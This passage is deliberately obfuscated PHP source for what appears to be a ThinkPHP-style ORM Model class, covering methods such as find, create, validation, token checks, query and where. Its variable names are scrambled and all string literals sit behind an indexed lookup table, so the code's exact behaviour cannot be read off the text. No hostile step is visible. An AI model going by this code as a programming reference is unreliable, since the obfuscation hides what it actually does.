_options_filter(&$±ôñ±ş¿) { } protected function _parseType(&$Õİ‡ÜòÃ, $±éÙ°) { $ÏÉµ£Ô´ =& $_SERVER[€ä¾™²]; if (empty($this->options[$ÏÉµ£Ô´[362]][$ÏÉµ£Ô´[4] . $±éÙ°])) { $Ÿ“­™Ÿ™ = strtolower($this->fields[$ÏÉµ£Ô´[330]][$±éÙ°]); if (!1 !== strpos($Ÿ“­™Ÿ™, $ÏÉµ£Ô´[363])) { } elseif (!1 === strpos($Ÿ“­™Ÿ™, $ÏÉµ£Ô´[364]) && !1 !== strpos($Ÿ“­™Ÿ™, $ÏÉµ£Ô´[365])) { $Õİ‡ÜòÃ[$±éÙ°] = intval($Õİ‡ÜòÃ[$±éÙ°]); } elseif (!1 !== strpos($Ÿ“­™Ÿ™, $ÏÉµ£Ô´[366]) || !1 !== strpos($Ÿ“­™Ÿ™, $ÏÉµ£Ô´[367])) { $Õİ‡ÜòÃ[$±éÙ°] = floatval($Õİ‡ÜòÃ[$±éÙ°]); } elseif (!1 !== strpos($Ÿ“­™Ÿ™, $ÏÉµ£Ô´[368])) { $Õİ‡ÜòÃ[$±éÙ°] = (bool) $Õİ‡ÜòÃ[$±éÙ°]; } } } public function find($õÑ¶ğ· = array()) { $çô…•—û =& $_SERVER[€ä¾™²]; if (is_numeric($õÑ¶ğ·) || is_string($õÑ¶ğ·)) { $ÀÛ¨æßŒ[$this->getPk()] = intval($õÑ¶ğ·); $this->options[$çô…•—û[354]] = $ÀÛ¨æßŒ; } $this->options[$çô…•—û[369]] = 1; $õÑ¶ğ· = $this->_parseOptions(); $¹ëÑÑ¶æ = $this->db->select($õÑ¶ğ·); if (!1 === $¹ëÑÑ¶æ) { return !1; } if (empty($¹ëÑÑ¶æ)) { return null; } $ä°ëÒç = $¹ëÑÑ¶æ[0]; $this->_afterFind($ä°ëÒç, $õÑ¶ğ·); return $ä°ëÒç; } protected function _afterFind(&$¨æäÓÅÖ, $…˜û †ƒ) { } protected function returnResult($ùœúÄñ³, $Ûıâªæ = '') { $èêÜ¯û› =& $_SERVER[€ä¾™²]; if ($Ûıâªæ) { if (is_callable($Ûıâªæ)) { return call_user_func($Ûıâªæ, $ùœúÄñ³); } switch (strtolower($Ûıâªæ)) { case $èêÜ¯û›[370]: return json_encode($ùœúÄñ³); case $èêÜ¯û›[371]: return xml_encode($ùœúÄñ³); } } return $ùœúÄñ³; } public function parseFieldsMap($Ë›Ôä¢¯, $›Åº¶É = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÊïŸûàá => $…¾×œí) { if ($›Åº¶É == 1) { if (isset($Ë›Ôä¢¯[$…¾×œí])) { $Ë›Ôä¢¯[$ÊïŸûàá] = $Ë›Ôä¢¯[$…¾×œí]; unset($Ë›Ôä¢¯[$…¾×œí]); } } else { if (isset($Ë›Ôä¢¯[$ÊïŸûàá])) { $Ë›Ôä¢¯[$…¾×œí] = $Ë›Ôä¢¯[$ÊïŸûàá]; unset($Ë›Ôä¢¯[$ÊïŸûàá]); } } } } return $Ë›Ôä¢¯; } public function setField($Ö®ù¿²¾, $½âè×ïÈ = '') { if (is_array($Ö®ù¿²¾)) { $›è’£”¥ = $Ö®ù¿²¾; } else { $›è’£”¥[$Ö®ù¿²¾] = $½âè×ïÈ; } return $this->save($›è’£”¥); } public function setAdd($İğ„½ã†, $¹»áÎ¯ = 1) { $ÀˆÆçîÌ =& $_SERVER[€ä¾™²]; $‘¶¦„Ğ® = $İğ„½ã† . $ÀˆÆçîÌ[372] . $¹»áÎ¯; if ($¹»áÎ¯ < 0) { $‘¶¦„Ğ® = $İğ„½ã† . $¹»áÎ¯; } return $this->setField($İğ„½ã†, array($ÀˆÆçîÌ[373], $‘¶¦„Ğ®)); } public function getField($å‹‚¯†à, $ÔÍÏÈİ» = null) { $ùÃçğˆ =& $_SERVER[€ä¾™²]; $ßÓùËÁ[$ùÃçğˆ[352]] = $å‹‚¯†à; $ßÓùËÁ = $this->_parseOptions($ßÓùËÁ); $å‹‚¯†à = trim($å‹‚¯†à); if (strpos($å‹‚¯†à, $ùÃçğˆ[50])) { if (!isset($ßÓùËÁ[$ùÃçğˆ[369]])) { $ßÓùËÁ[$ùÃçğˆ[369]] = is_numeric($ÔÍÏÈİ») ? $ÔÍÏÈİ» : $ùÃçğˆ[12]; } $‘şº—¥ù = $this->db->select($ßÓùËÁ); if (!empty($‘şº—¥ù)) { $âíÓÏ„ = explode($ùÃçğˆ[50], $å‹‚¯†à); $å‹‚¯†à = array_keys($‘şº—¥ù[0]); $ËšÙ¸…à = array_shift($å‹‚¯†à); $Ê©½œò = array_shift($å‹‚¯†à); $É©›¤£  = array(); $¤Í´Ÿãé = count($âíÓÏ„); foreach ($‘şº—¥ù as $öÁÎ“×) { $‹¾şêƒè = $öÁÎ“×[$ËšÙ¸…à]; if (2 == $¤Í´Ÿãé) { $É©›¤£ [$‹¾şêƒè] = $öÁÎ“×[$Ê©½œò]; } else { $É©›¤£ [$‹¾şêƒè] = is_string($ÔÍÏÈİ») ? implode($ÔÍÏÈİ», $öÁÎ“×) : $öÁÎ“×; } } return $É©›¤£ ; } } else { if (!0 !== $ÔÍÏÈİ») { $ßÓùËÁ[$ùÃçğˆ[369]] = is_numeric($ÔÍÏÈİ») ? $ÔÍÏÈİ» : 1; } if ($ÔÍÏÈİ» === $ùÃçğˆ[333]) { unset($ßÓùËÁ[$ùÃçğˆ[369]]); } $öÁÎ“× = $this->db->select($ßÓùËÁ); if (!empty($öÁÎ“×)) { if ($ÔÍÏÈİ» === $ùÃçğˆ[333]) { return reset($öÁÎ“×[0]); } if (!0 !== $ÔÍÏÈİ» && 1 == $ßÓùËÁ[$ùÃçğˆ[369]]) { return reset($öÁÎ“×[0]); } foreach ($öÁÎ“× as $ŒÚŠ’¼¿) { $ÉÃé¨¦[] = $ŒÚŠ’¼¿[$å‹‚¯†à]; } return $ÉÃé¨¦; } } return null; } public function create($ûø”şÂä = '', $ºÑ¶ãé = '') { $É¼ŠÄğÅ =& $_SERVER[€ä¾™²]; if (empty($ûø”şÂä)) { $ûø”şÂä = $_POST; } elseif (is_object($ûø”şÂä)) { $ûø”şÂä = get_object_vars($ûø”şÂä); } if (empty($ûø”şÂä) || !is_array($ûø”şÂä)) { $this->error = think_lang($É¼ŠÄğÅ[350]); return !1; } $ûø”şÂä = $this->parseFieldsMap($ûø”şÂä, 0); $ºÑ¶ãé = $ºÑ¶ãé ? $ºÑ¶ãé : (!empty($ûø”şÂä[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$É¼ŠÄğÅ[352]])) { $¸¦Ğñúõ = $this->options[$É¼ŠÄğÅ[352]]; unset($this->options[$É¼ŠÄğÅ[352]]); } elseif ($ºÑ¶ãé == THINK_MODEL_INSERT && isset($this->insertFields)) { $¸¦Ğñúõ = $this->insertFields; } elseif ($ºÑ¶ãé == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¸¦Ğñúõ = $this->updateFields; } if (isset($¸¦Ğñúõ)) { if (is_string($¸¦Ğñúõ)) { $¸¦Ğñúõ = explode($É¼ŠÄğÅ[50], $¸¦Ğñúõ); } if (think_config($É¼ŠÄğÅ[374])) { $¸¦Ğñúõ[] = think_config($É¼ŠÄğÅ[375]); } foreach ($ûø”şÂä as $Ö¼´Çõ„ => $ÚÀ…È±ç) { if (!in_array($Ö¼´Çõ„, $¸¦Ğñúõ)) { unset($ûø”şÂä[$Ö¼´Çõ„]); } } } if (!$this->autoValidation($ûø”şÂä, $ºÑ¶ãé)) { return !1; } if (!$this->autoCheckToken($ûø”şÂä)) { $this->error = think_lang($É¼ŠÄğÅ[376]); return !1; } if ($this->autoCheckFields) { $¸¦Ğñúõ = $this->getDbFields(); foreach ($ûø”şÂä as $Ö¼´Çõ„ => $ÚÀ…È±ç) { if (!in_array($Ö¼´Çõ„, $¸¦Ğñúõ)) { unset($ûø”şÂä[$Ö¼´Çõ„]); } elseif (MAGIC_QUOTES_GPC && is_string($ÚÀ…È±ç)) { $ûø”şÂä[$Ö¼´Çõ„] = stripslashes($ÚÀ…È±ç); } } } $this->autoOperation($ûø”şÂä, $ºÑ¶ãé); $this->data = $ûø”şÂä; return $ûø”şÂä; } public function autoCheckToken($¦â†êÆµ) { $ã”‘ä¦» =& $_SERVER[€ä¾™²]; if (isset($this->options[$ã”‘ä¦»[377]]) && !$this->options[$ã”‘ä¦»[377]]) { return !0; } if (think_config($ã”‘ä¦»[374])) { $’ŸÅ—óÈ = think_config($ã”‘ä¦»[375]); if (!isset($¦â†êÆµ[$’ŸÅ—óÈ]) || Session::get($’ŸÅ—óÈ)) { return !1; } list($ÇÕÅŞ¶, $â²—üø) = explode($ã”‘ä¦»[11], $¦â†êÆµ[$’ŸÅ—óÈ]); if ($â²—üø && Session::get($’ŸÅ—óÈ . $ã”‘ä¦»[10] . $ÇÕÅŞ¶) === $â²—üø) { Session::remove($’ŸÅ—óÈ . $ã”‘ä¦»[10] . $ÇÕÅŞ¶); return !0; } if (think_config($ã”‘ä¦»[378])) { Session::remove($’ŸÅ—óÈ . $ã”‘ä¦»[10] . $ÇÕÅŞ¶); } return !1; } return !0; } public function regex($şç¬ã¬Ù, $í¨«æËª) { $¦²‡ç“Ã =& $_SERVER[€ä¾™²]; $¡±²Ô¼ = array($¦²‡ç“Ã[379] => $¦²‡ç“Ã[380], $¦²‡ç“Ã[381] => $¦²‡ç“Ã[382], $¦²‡ç“Ã[383] => $¦²‡ç“Ã[384], $¦²‡ç“Ã[385] => $¦²‡ç“Ã[386], $¦²‡ç“Ã[387] => $¦²‡ç“Ã[388], $¦²‡ç“Ã[389] => $¦²‡ç“Ã[390], $¦²‡ç“Ã[391] => $¦²‡ç“Ã[392], $¦²‡ç“Ã[367] => $¦²‡ç“Ã[393], $¦²‡ç“Ã[394] => $¦²‡ç“Ã[395]); if (isset($¡±²Ô¼[strtolower($í¨«æËª)])) { $í¨«æËª = $¡±²Ô¼[strtolower($í¨«æËª)]; } return preg_match($í¨«æËª, $şç¬ã¬Ù) === 1; } private function autoOperation(&$ıàÉöÙğ, $™½¤Ôğä) { $ãİ‹Ü‚ú =& $_SERVER[€ä¾™²]; if (!empty($this->options[$ãİ‹Ü‚ú[396]])) { $–õóö‰Æ = $this->options[$ãİ‹Ü‚ú[396]]; unset($this->options[$ãİ‹Ü‚ú[396]]); } elseif (!empty($this->_auto)) { $–õóö‰Æ = $this->_auto; } if (isset($–õóö‰Æ)) { foreach ($–õóö‰Æ as $­ÕÃ÷„) { if (empty($­ÕÃ÷„[2])) { $­ÕÃ÷„[2] = THINK_MODEL_INSERT; } if ($™½¤Ôğä == $­ÕÃ÷„[2] || $­ÕÃ÷„[2] == THINK_MODEL_BOTH) { switch (trim($­ÕÃ÷„[3])) { case $ãİ‹Ü‚ú[397]: case $ãİ‹Ü‚ú[398]: $§Éİ‰ç = isset($­ÕÃ÷„[4]) ? (array) $­ÕÃ÷„[4] : array(); if (isset($ıàÉöÙğ[$­ÕÃ÷„[0]])) { array_unshift($§Éİ‰ç, $ıàÉöÙğ[$­ÕÃ÷„[0]]); } if ($ãİ‹Ü‚ú[397] == $­ÕÃ÷„[3]) { $ıàÉöÙğ[$­ÕÃ÷„[0]] = call_user_func_array($­ÕÃ÷„[1], $§Éİ‰ç); } else { $ıàÉöÙğ[$­ÕÃ÷„[0]] = call_user_func_array(array(&$this, $­ÕÃ÷„[1]), $§Éİ‰ç); } break; case $ãİ‹Ü‚ú[352]: $ıàÉöÙğ[$­ÕÃ÷„[0]] = $ıàÉöÙğ[$­ÕÃ÷„[1]]; break; case $ãİ‹Ü‚ú[399]: if ($ãİ‹Ü‚ú[12] === $ıàÉöÙğ[$­ÕÃ÷„[0]]) { unset($ıàÉöÙğ[$­ÕÃ÷„[0]]); } break; case $ãİ‹Ü‚ú[400]: default: $ıàÉöÙğ[$­ÕÃ÷„[0]] = $­ÕÃ÷„[1]; } if (!1 === $ıàÉöÙğ[$­ÕÃ÷„[0]]) { unset($ıàÉöÙğ[$­ÕÃ÷„[0]]); } } } } return $ıàÉöÙğ; } protected function autoValidation($Ìùî±™Æ, $šÔ÷ïºÏ) { $µ°¿ =& $_SERVER[€ä¾™²]; if (!empty($this->options[$µ°¿[401]])) { $’¡·‚×Û = $this->options[$µ°¿[401]]; unset($this->options[$µ°¿[401]]); } elseif (!empty($this->_validate)) { $’¡·‚×Û = $this->_validate; } if (isset($’¡·‚×Û)) { if ($this->patchValidate) { $this->error = array(); } foreach ($’¡·‚×Û as $ÃÈ¯áâ => $¨”£Í²Õ) { if (empty($¨”£Í²Õ[5]) || $¨”£Í²Õ[5] == THINK_MODEL_BOTH || $¨”£Í²Õ[5] == $šÔ÷ïºÏ) { if (0 == strpos($¨”£Í²Õ[2], $µ°¿[402]) && strpos($¨”£Í²Õ[2], $µ°¿[403])) { $¨”£Í²Õ[2] = think_lang(substr($¨”£Í²Õ[2], 2, -1)); } $¨”£Í²Õ[3] = isset($¨”£Í²Õ[3]) ? $¨”£Í²Õ[3] : THINK_EXISTS_VALIDATE; $¨”£Í²Õ[4] = isset($¨”£Í²Õ[4]) ? $¨”£Í²Õ[4] : $µ°¿[404]; switch ($¨”£Í²Õ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ìùî±™Æ, $¨”£Í²Õ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($µ°¿[12] != trim($Ìùî±™Æ[$¨”£Í²Õ[0]])) { if (!1 === $this->_validationField($Ìùî±™Æ, $¨”£Í²Õ)) { return !1; } } break; default: if (isset($Ìùî±™Æ[$¨”£Í²Õ[0]])) { if (!1 === $this->_validationField($Ìùî±™Æ, $¨”£Í²Õ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($›¼¹å²Ç, $ÅƒÆœ„) { if (!1 === $this->_validationFieldItem($›¼¹å²Ç, $ÅƒÆœ„)) { if ($this->patchValidate) { $this->error[$ÅƒÆœ„[0]] = $ÅƒÆœ„[2]; } else { $this->error = $ÅƒÆœ„[2]; return !1; } } return; } protected function _validationFieldItem($§§µİÏ , $ÄÌœ©×Ş) { $¬ØÒ¤ºù =& $_SERVER[€ä¾™²]; switch (strtolower(trim($ÄÌœ©×Ş[4]))) { case $¬ØÒ¤ºù[397]: case $¬ØÒ¤ºù[398]: $ ğÒú¨ƒ = isset($ÄÌœ©×Ş[6]) ? (array) $ÄÌœ©×Ş[6] : array(); if (is_string($ÄÌœ©×Ş[0]) && strpos($ÄÌœ©×Ş[0], $¬ØÒ¤ºù[50])) { $ÄÌœ©×Ş[0] = explode($¬ØÒ¤ºù[50], $ÄÌœ©×Ş[0]); } if (is_array($ÄÌœ©×Ş[0])) { foreach ($ÄÌœ©×Ş[0] as $³›ÂâÌ’) { $ú¼éÖì„[$³›ÂâÌ’] = $§§µİÏ [$³›ÂâÌ’]; } array_unshift($ ğÒú¨ƒ, $ú¼éÖì„); } else { array_unshift($ ğÒú¨ƒ, $§§µİÏ [$ÄÌœ©×Ş[0]]); } if ($¬ØÒ¤ºù[397] == $ÄÌœ©×Ş[4]) { return call_user_func_array($ÄÌœ©×Ş[1], $ ğÒú¨ƒ); } else { return call_user_func_array(array(&$this, $ÄÌœ©×Ş[1]), $ ğÒú¨ƒ); } case $¬ØÒ¤ºù[405]: return $§§µİÏ [$ÄÌœ©×Ş[0]] == $§§µİÏ [$ÄÌœ©×Ş[1]]; case $¬ØÒ¤ºù[406]: if (is_string($ÄÌœ©×Ş[0]) && strpos($ÄÌœ©×Ş[0], $¬ØÒ¤ºù[50])) { $ÄÌœ©×Ş[0] = explode($¬ØÒ¤ºù[50], $ÄÌœ©×Ş[0]); } $ÙÊúáÈ² = array(); if (is_array($ÄÌœ©×Ş[0])) { foreach ($ÄÌœ©×Ş[0] as $³›ÂâÌ’) { $ÙÊúáÈ²[$³›ÂâÌ’] = $§§µİÏ [$³›ÂâÌ’]; } } else { $ÙÊúáÈ²[$ÄÌœ©×Ş[0]] = $§§µİÏ [$ÄÌœ©×Ş[0]]; } if (!empty($§§µİÏ [$this->getPk()])) { $ÙÊúáÈ²[$this->getPk()] = array($¬ØÒ¤ºù[407], $§§µİÏ [$this->getPk()]); } if ($this->where($ÙÊúáÈ²)->find()) { return !1; } return !0; default: return $this->check($§§µİÏ [$ÄÌœ©×Ş[0]], $ÄÌœ©×Ş[1], $ÄÌœ©×Ş[4]); } } public function check($¨Ï•Âö, $Î³­ÜÂ, $Õá–òÅ = "\162\145\147\145\x78") { $áŸÅÅÜ‡ =& $_SERVER[€ä¾™²]; $Õá–òÅ = strtolower(trim($Õá–òÅ)); switch ($Õá–òÅ) { case $áŸÅÅÜ‡[7]: case $áŸÅÅÜ‡[408]: $Ü“¥ô = is_array($Î³­ÜÂ) ? $Î³­ÜÂ : explode($áŸÅÅÜ‡[50], $Î³­ÜÂ); return $Õá–òÅ == $áŸÅÅÜ‡[7] ? in_array($¨Ï•Âö, $Ü“¥ô) : !in_array($¨Ï•Âö, $Ü“¥ô); case $áŸÅÅÜ‡[409]: case $áŸÅÅÜ‡[410]: if (is_array($Î³­ÜÂ)) { $Ï§Çø¿ı = $Î³­ÜÂ[0]; $óà²—ø¹ = $Î³­ÜÂ[1]; } else { list($Ï§Çø¿ı, $óà²—ø¹) = explode($áŸÅÅÜ‡[50], $Î³­ÜÂ); } return $Õá–òÅ == $áŸÅÅÜ‡[409] ? $¨Ï•Âö >= $Ï§Çø¿ı && $¨Ï•Âö <= $óà²—ø¹ : $¨Ï•Âö < $Ï§Çø¿ı || $¨Ï•Âö > $óà²—ø¹; case $áŸÅÅÜ‡[411]: case $áŸÅÅÜ‡[412]: return $Õá–òÅ == $áŸÅÅÜ‡[411] ? $¨Ï•Âö == $Î³­ÜÂ : $¨Ï•Âö != $Î³­ÜÂ; case $áŸÅÅÜ‡[413]: $Ã·ÉĞñ£ = mb_strlen($¨Ï•Âö, $áŸÅÅÜ‡[414]); if (strpos($Î³­ÜÂ, $áŸÅÅÜ‡[50])) { list($Ï§Çø¿ı, $óà²—ø¹) = explode($áŸÅÅÜ‡[50], $Î³­ÜÂ); return $Ã·ÉĞñ£ >= $Ï§Çø¿ı && $Ã·ÉĞñ£ <= $óà²—ø¹; } else { return $Ã·ÉĞñ£ == $Î³­ÜÂ; } case $áŸÅÅÜ‡[415]: list($äôÕî×Ç, $ĞÃ÷§¬ƒ) = explode($áŸÅÅÜ‡[50], $Î³­ÜÂ); if (!is_numeric($äôÕî×Ç)) { $äôÕî×Ç = strtotime($äôÕî×Ç); } if (!is_numeric($ĞÃ÷§¬ƒ)) { $ĞÃ÷§¬ƒ = strtotime($ĞÃ÷§¬ƒ); } return NOW_TIME >= $äôÕî×Ç && NOW_TIME <= $ĞÃ÷§¬ƒ; case $áŸÅÅÜ‡[416]: return in_array(get_client_ip(), explode($áŸÅÅÜ‡[50], $Î³­ÜÂ)); case $áŸÅÅÜ‡[417]: return !in_array(get_client_ip(), explode($áŸÅÅÜ‡[50], $Î³­ÜÂ)); case $áŸÅÅÜ‡[404]: default: return $this->regex($¨Ï•Âö, $Î³­ÜÂ); } } public function query($‡¾™…§, $Ã‚åİÚ† = false) { $¡šŞÄ =& $_SERVER[€ä¾™²]; if (!is_bool($Ã‚åİÚ†) && !is_array($Ã‚åİÚ†)) { $Ã‚åİÚ† = func_get_args(); array_shift($Ã‚åİÚ†); } $‡¾™…§ = str_replace(array($¡šŞÄ[286], $¡šŞÄ[418]), $¡šŞÄ[53], $‡¾™…§); $‡¾™…§ = $this->parseSql($‡¾™…§, $Ã‚åİÚ†); return $this->db->query($‡¾™…§); } public function execute($Á„‹¢Ï, $ìÏñòË– = false) { if (!is_bool($ìÏñòË–) && !is_array($ìÏñòË–)) { $ìÏñòË– = func_get_args(); array_shift($ìÏñòË–); } $Á„‹¢Ï = $this->parseSql($Á„‹¢Ï, $ìÏñòË–); return $this->db->execute($Á„‹¢Ï); } protected function parseSql($ë•ô…“‘, $¼ÓÍ¾¯Ë) { $åÉî˜Ò¾ =& $_SERVER[€ä¾™²]; if (!0 === $¼ÓÍ¾¯Ë) { $¡Éôé÷… = $this->_parseOptions(); $ë•ô…“‘ = $this->db->parseSql($ë•ô…“‘, $¡Éôé÷…); } elseif (is_array($¼ÓÍ¾¯Ë)) { $¼ÓÍ¾¯Ë = array_map(array($this->db, $åÉî˜Ò¾[419]), $¼ÓÍ¾¯Ë); $ë•ô…“‘ = vsprintf($ë•ô…“‘, $¼ÓÍ¾¯Ë); } else { $ë•ô…“‘ = strtr($ë•ô…“‘, array($åÉî˜Ò¾[420] => $this->getTableName(), $åÉî˜Ò¾[421] => think_config($åÉî˜Ò¾[322]))); } $this->db->setModel($this->name); return $ë•ô…“‘; } public function db($ÛòÛÂı = '', $˜ø¶Ş“· = '', $½Úè±¬“ = array()) { $âäğ†Õ =& $_SERVER[€ä¾™²]; if ($âäğ†Õ[12] === $ÛòÛÂı && $this->db) { return $this->db; } static $»ğ¯ÇóÄ = array(); static $™Âõü”• = array(); if (!isset($™Âõü”•[$ÛòÛÂı]) || isset($™Âõü”•[$ÛòÛÂı]) && $˜ø¶Ş“· && $»ğ¯ÇóÄ[$ÛòÛÂı] != $˜ø¶Ş“·) { if (!empty($˜ø¶Ş“·) && is_string($˜ø¶Ş“·) && !1 === strpos($˜ø¶Ş“·, $âäğ†Õ[8])) { $˜ø¶Ş“· = think_config($˜ø¶Ş“·); } $ÛòÛÂı = think_guid($˜ø¶Ş“·); $™Âõü”•[$ÛòÛÂı] = Db::getInstance($˜ø¶Ş“·); } elseif (NULL === $˜ø¶Ş“·) { $™Âõü”•[$ÛòÛÂı]->close(); unset($™Âõü”•[$ÛòÛÂı]); return; } if (!empty($½Úè±¬“)) { if (is_string($½Úè±¬“)) { parse_str($½Úè±¬“, $½Úè±¬“); } foreach ($½Úè±¬“ as $˜¿Ì‚Ş => $•ŠÜ…Ø‘) { $this->setProperty($˜¿Ì‚Ş, $•ŠÜ…Ø‘); } } $»ğ¯ÇóÄ[$ÛòÛÂı] = $˜ø¶Ş“·; $this->db = $™Âõü”•[$ÛòÛÂı]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $»ıòœÉ = get_class($this); if ($»ıòœÉ == $_SERVER[€ä¾™²][422]) { return $this->name; } $this->name = substr($»ıòœÉ, 0, -5); } return $this->name; } public function getTableName() { $öÔì¬  =& $_SERVER[€ä¾™²]; if (empty($this->trueTableName)) { $ÙòıŞ€± = !empty($this->tablePrefix) ? $this->tablePrefix : $öÔì¬ [12]; if (!empty($this->tableName)) { $ÙòıŞ€± .= $this->tableName; } else { $ÙòıŞ€± .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÙòıŞ€±); } return (!empty($this->dbName) ? $this->dbName . $öÔì¬ [10] : $öÔì¬ [12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ûÑÖÌ°» =& $_SERVER[€ä¾™²]; return isset($this->fields[$ûÑÖÌ°»[329]]) ? $this->fields[$ûÑÖÌ°»[329]] : $this->pk; } public function getDbFields() { $ ¬˜Ì¥ =& $_SERVER[€ä¾™²]; if (isset($this->options[$ ¬˜Ì¥[358]])) { $“™å×ÌŒ = $this->db->getFields($this->options[$ ¬˜Ì¥[358]]); return $“™å×ÌŒ ? array_keys($“™å×ÌŒ) : !1; } if ($this->fields) { $“™å×ÌŒ = $this->fields; unset($“™å×ÌŒ[$ ¬˜Ì¥[328]], $“™å×ÌŒ[$ ¬˜Ì¥[329]], $“™å×ÌŒ[$ ¬˜Ì¥[330]], $“™å×ÌŒ[$ ¬˜Ì¥[327]]); return $“™å×ÌŒ; } return !1; } public function data($˜•ÚÄğ‘ = '') { $ğ·Áğ½Ï =& $_SERVER[€ä¾™²]; if ($ğ·Áğ½Ï[12] === $˜•ÚÄğ‘ && !empty($this->data)) { return $this->data; } if (is_object($˜•ÚÄğ‘)) { $˜•ÚÄğ‘ = get_object_vars($˜•ÚÄğ‘); } elseif (is_string($˜•ÚÄğ‘)) { parse_str($˜•ÚÄğ‘, $˜•ÚÄğ‘); } elseif (!is_array($˜•ÚÄğ‘)) { think_exception(think_lang($ğ·Áğ½Ï[350])); } $this->data = $˜•ÚÄğ‘; return $this; } public function join($›šş‚ı²) { $¸Çã×İÍ =& $_SERVER[€ä¾™²]; if (is_array($›šş‚ı²)) { $this->options[$¸Çã×İÍ[361]] = $›šş‚ı²; } elseif (!empty($›šş‚ı²)) { $this->options[$¸Çã×İÍ[361]][] = $›šş‚ı²; } return $this; } public function union($ĞáÛÚœ½, $‰ÁåÆŸ = false) { $‹ “¯½£ =& $_SERVER[€ä¾™²]; if (empty($ĞáÛÚœ½)) { return $this; } if ($‰ÁåÆŸ) { $this->options[$‹ “¯½£[423]][$‹ “¯½£[424]] = !0; } if (is_object($ĞáÛÚœ½)) { $ĞáÛÚœ½ = get_object_vars($ĞáÛÚœ½); } if (is_string($ĞáÛÚœ½)) { $–Â—“ÌÓ = $ĞáÛÚœ½; } elseif (is_array($ĞáÛÚœ½)) { if (isset($ĞáÛÚœ½[0])) { $this->options[$‹ “¯½£[423]] = array_merge($this->options[$‹ “¯½£[423]], $ĞáÛÚœ½); return $this; } else { $–Â—“ÌÓ = $ĞáÛÚœ½; } } else { think_exception(think_lang($‹ “¯½£[350])); } $this->options[$‹ “¯½£[423]][] = $–Â—“ÌÓ; return $this; } public function cache($ªì¨ëİ¸ = true, $û×Œœ¿Ö = null, $ŠÌ²Ò ¯ = '') { $ÜÖœÍúï =& $_SERVER[€ä¾™²]; if (!1 !== $ªì¨ëİ¸) { $this->options[$ÜÖœÍúï[425]] = array($ÜÖœÍúï[95] => $ªì¨ëİ¸, $ÜÖœÍúï[415] => $û×Œœ¿Ö, $ÜÖœÍúï[33] => $ŠÌ²Ò ¯); } return $this; } public function field($‘›˜ñ²ü, $£¢ÇïÇ = false) { $áğ‘´ù± =& $_SERVER[€ä¾™²]; if (!0 === $‘›˜ñ²ü) { $Îç×ô†ö = $this->getDbFields(); $‘›˜ñ²ü = $Îç×ô†ö ? $Îç×ô†ö : $áğ‘´ù±[221]; } elseif ($£¢ÇïÇ) { if (is_string($‘›˜ñ²ü)) { $‘›˜ñ²ü = explode($áğ‘´ù±[50], $‘›˜ñ²ü); } $Îç×ô†ö = $this->getDbFields(); $‘›˜ñ²ü = $Îç×ô†ö ? array_diff($Îç×ô†ö, $‘›˜ñ²ü) : $‘›˜ñ²ü; } $this->options[$áğ‘´ù±[352]] = $‘›˜ñ²ü; return $this; } public function scope($½ÎÁ’ = '', $¦×¢‚¶‹ = NULL) { $ÕÕ¥Ú =& $_SERVER[€ä¾™²]; if ($ÕÕ¥Ú[12] === $½ÎÁ’) { if (isset($this->_scope[$ÕÕ¥Ú[37]])) { $–ÓŒî† = $this->_scope[$ÕÕ¥Ú[37]]; } else { return $this; } } elseif (is_string($½ÎÁ’)) { $®°¢ƒ¹Ç = explode($ÕÕ¥Ú[50], $½ÎÁ’); $–ÓŒî† = array(); foreach ($®°¢ƒ¹Ç as $”€¤Şù) { if (!isset($this->_scope[$”€¤Şù])) { continue; } $–ÓŒî† = array_merge($–ÓŒî†, $this->_scope[$”€¤Şù]); } if (!empty($¦×¢‚¶‹) && is_array($¦×¢‚¶‹)) { $–ÓŒî† = array_merge($–ÓŒî†, $¦×¢‚¶‹); } } elseif (is_array($½ÎÁ’)) { $–ÓŒî† = $½ÎÁ’; } if (is_array($–ÓŒî†) && !empty($–ÓŒî†)) { $this->options = array_merge($this->options, array_change_key_case($–ÓŒî†)); } return $this; } public function where($Ç´¼ûì, $õòÌİôú = null) { $óöà«ĞÇ =& $_SERVER[€ä¾™²]; if (!is_null($õòÌİôú) && is_string($Ç´¼ûì)) { if (!is_array($õòÌİôú)) { $õòÌİôú = func_get_args(); array_shift($õòÌİôú); } $õòÌİôú = array_map(array($this->db, $óöà«ĞÇ[419]), $õòÌİôú); $Ç´¼ûì = vsprintf($Ç´¼ûì, $õòÌİôú); } elseif (is_object($Ç´¼ûì)) { $Ç´¼ûì = get_object_vars($Ç´¼ûì); } elseif (is_array($Ç´¼ûì)) { foreach ($Ç´¼ûì as $°¾Ó”Š => $†ëËê¯Ï) { if ((is_numeric($°¾Ó”Š) || !$°¾Ó”Š) && is_string($†ëËê¯Ï)) { if (strpos($†ëËê¯Ï, $óöà«ĞÇ[426]) === 0) { continue; } think_trace($óöà«ĞÇ[427], $óöà«ĞÇ[12], $óöà«ĞÇ[49]); die; } } } if (is_string($Ç´¼ûì) && $óöà«ĞÇ[12] != $Ç´¼ûì) { $äôÍë = array(); $äôÍë[$óöà«ĞÇ[428]] = $Ç´¼ûì; $Ç´¼ûì = $äôÍë; } if (isset($this->options[$óöà«ĞÇ[354]])) { $this->options[$óöà«ĞÇ[354]] = array_merge($this->options[$óöà«ĞÇ[354]], $Ç´¼ûì); } else { $this->options[$óöà«ĞÇ[354]] = $Ç´¼ûì; } return $this; } public function limit($¼„¼òãØ, $‚ğ±¶ø = null) { $ÈšÙ°Ò =& $_SERVER[€ä¾™²]; $this->options[$ÈšÙ°Ò[369]] = is_null($‚ğ±¶ø) ? $¼„¼òãØ : $¼„¼òãØ . $ÈšÙ°Ò[50] . $‚ğ±¶ø; return $this; } public function page($»ÌäõŒï, $ø—ı–±€ = 